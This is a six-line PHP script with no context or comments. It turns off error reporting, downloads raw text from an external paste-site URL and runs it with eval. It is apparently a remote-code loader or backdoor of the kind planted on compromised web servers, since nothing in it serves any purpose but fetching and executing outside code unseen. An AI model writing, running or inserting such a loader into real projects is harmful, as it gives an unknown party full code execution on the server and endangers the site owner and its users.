<?php
error_reporting(0);
$url = 'https://paste.idcloudhosting.my.id/paste/zm598/raw';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>